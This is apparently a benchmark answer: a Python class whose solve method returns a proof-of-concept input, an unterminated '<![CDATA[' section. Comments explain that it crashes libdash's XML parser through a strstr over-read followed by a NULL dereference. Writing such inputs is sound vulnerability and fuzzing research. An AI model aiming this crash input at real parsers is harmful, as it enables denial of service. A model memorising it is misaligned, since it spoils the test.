class Solution:
    def solve(self, src_path: str)
 -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is in libdash's custom XML parser. It occurs when an
        # unterminated CDATA section is parsed. The code uses strstr to find the
        # closing "]]>" delimiter. If the delimiter is not found, strstr reads
        # past the end of the input buffer, causing a heap-buffer-read.
        # If strstr returns NULL, a subsequent dereference (*end = '\0') causes
        # a crash.
        # The minimal input to trigger this path is one that opens a CDATA
        # section but does not close it.
        return b"<
![CDATA["